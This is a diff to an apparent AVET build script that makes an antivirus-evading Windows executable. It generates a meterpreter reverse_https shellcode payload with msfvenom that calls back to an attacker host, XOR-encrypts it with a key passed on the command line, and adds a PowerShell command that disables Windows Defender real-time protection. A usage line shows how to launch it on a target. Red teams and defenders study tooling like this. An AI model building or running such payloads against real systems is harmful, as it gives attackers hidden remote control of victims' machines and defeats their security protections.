@@ -1,5 +1,10 @@
 #!/bin/bash    
-# Execute 64-bit shellcode. Uses XOR encoder from metasploit, as well as AVET encoding.
+# Execute 64-bit shellcode.
+# Encrypts the payload with a dynamic XOR key, which needs to be provided via command line argument 2 to decrypt.
+# Attempts to disable Windows Defender's real-time protection via Powershell command "Set-MpPreference -DisableRealtimeMonitoring $true".
+#
+# Call on target like:  output.exe first aabbccddee
+
 
 # print AVET logo
 cat banner.txt
@@ -20,25 +25,28 @@ LPORT=$GLOBAL_LPORT
 LHOST=$GLOBAL_LHOST
 
 # make meterpreter reverse payload
-msfvenom -p windows/x64/meterpreter/reverse_https lhost=$LHOST lport=$LPORT -e x64/xor -f c --platform Windows > input/sc_c.txt
+msfvenom -p windows/x64/meterpreter/reverse_https lhost=$LHOST lport=$LPORT -e x64/xor -f raw --platform Windows > input/sc_raw.txt
 
-# Apply AVET encoding
-encode_payload avet input/sc_c.txt input/scenc_raw.txt
+# try to disable Windows Defender's real-time protection via powershell
+set_command_source static_from_here 'Set-MpPreference -DisableRealtimeMonitoring $true'
+set_command_exec exec_via_powershell
+
+# generate key file
+generate_key preset aabbccddee input/key_raw.txt
+
+# encrypt payload
+encode_payload xor input/sc_raw.txt input/scenc_raw.txt input/key_raw.txt
 
 # convert to c array format for static include
 ./tools/data_raw_to_c/data_raw_to_c input/scenc_raw.txt input/scenc_c.txt buf
 
-# no command preexec
-set_command_source none
-set_command_exec none
-
-# set shellcode source
+# set encrypted payload as source
 set_payload_source static_from_file input/scenc_c.txt
 
 # set decoder and key source
-# AVET decoder requires no key
-set_decoder avet
-set_key_source none
+# key is retrieved in hex format from command line
+set_decoder xor
+set_key_source from_command_line_hex
 
 # set payload info source
 set_payload_info_source none
